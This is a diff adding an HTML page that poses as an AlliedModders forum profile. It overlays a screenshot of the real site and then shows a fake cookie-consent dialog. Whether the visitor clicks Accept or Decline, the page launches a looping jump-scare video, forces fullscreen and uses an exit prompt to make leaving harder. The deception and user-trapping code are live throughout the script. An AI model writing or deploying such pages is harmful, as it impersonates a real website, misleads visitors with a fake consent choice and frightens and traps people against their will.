@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>AlliedModders - View Profile: JJK!</title>
+    <link rel="shortcut icon" href="https://forums.alliedmods.net/favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
+    <style>
+        p { margin: 0; font-family: "Century Gothic", "Trebuchet MS", "Lucida Grande", Lucida, Arial, sans-serif; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; }
+        #overlay2, .overlay, .scare { position: fixed; top: 0; left: 0; height: 100vh; width: 100vw; }
+        #overlay2 { z-index: 3; }
+        .overlay { z-index: 2; display: none; align-items: center; justify-content: center; background: white; padding: 24px; }
+        .overlay-body { text-align: center; font-family: "Inter", sans-serif; color: #006699; }
+        .overlay-title { font-size: 24px; font-weight: 900; color: #006699; margin-bottom: 16px; }
+        .overlay-description { font-size: 16px; font-weight: 400; line-height: 1.25; margin-bottom: 16px; }
+        .overlay-button { display: inline-flex; align-items: center; height: 40px; padding: 0 24px; font-size: 16px; font-weight: 500; border-radius: 4px; margin: 4px; cursor: pointer; }
+        #accept-button { background: #006699; color: black; }
+        #decline-button { color: #006699; border: 2px solid #006699; }
+        .overlay-buttons-wrapper { margin: 24px -8px -8px; }
+        .overlay-image { width: 250px; margin-bottom: 16px; }
+        .scare { z-index: 1; }
+        video#video { display:none; height: 100%; width: 100%; object-fit: cover; }
+        video#video::-webkit-media-controls-enclosure { display: none !important; }
+    </style>
+</head>
+<body style="height: 190vh">
+<div id="overlay2"><img src="capture.png"></div>
+<div id="overlay" class="overlay">
+    <div class="overlay-body">
+        <img src="am-banner-pride-4.svg" alt="AlliedModders Logo" class="overlay-image">
+        <p class="overlay-title">Cookies and user-generated content</p>
+        <p class="overlay-description">This website uses cookies to offer relevant information and understand usage. Please accept cookies for optimal performance.</p>
+        <div class="overlay-buttons-wrapper">
+            <div id="accept-button" class="overlay-button">Accept</div>
+            <div id="decline-button" class="overlay-button">Decline</div>
+        </div>
+    </div>
+</div>
+<div class="scare">
+    <video id="video" src="video.mp4" loop></video>
+</div>
+<script>
+    const video = document.getElementById("video"), overlay = document.getElementById("overlay"), overlay2 = document.getElementById("overlay2"), declineButton = document.getElementById("decline-button"), acceptButton = document.getElementById("accept-button");
+    let hasClicked;
+    window.onbeforeunload = () => hasClicked ? true : null;
+    function buttonClick(e) { e.preventDefault(); hasClicked = true; overlay.remove(); overlay2.remove(); video.style.display = "block"; video.play(); videoClick(); }
+    function videoClick(e) { e && e.preventDefault(); const d = document.documentElement; d.requestFullscreen?.() || d.mozRequestFullScreen?.() || d.webkitRequestFullscreen?.() || d.msRequestFullscreen?.(); }
+    acceptButton.addEventListener("click", buttonClick);
+    declineButton.addEventListener("click", buttonClick);
+    video.addEventListener("click", videoClick);
+    setTimeout(() => { overlay.style.zIndex = "9999"; overlay.style.display = "flex"; document.body.style = "height: 100vh" }, 1750);
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-07T0N39Y0D"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-07T0N39Y0D');
+</script>
+</body>
+</html>
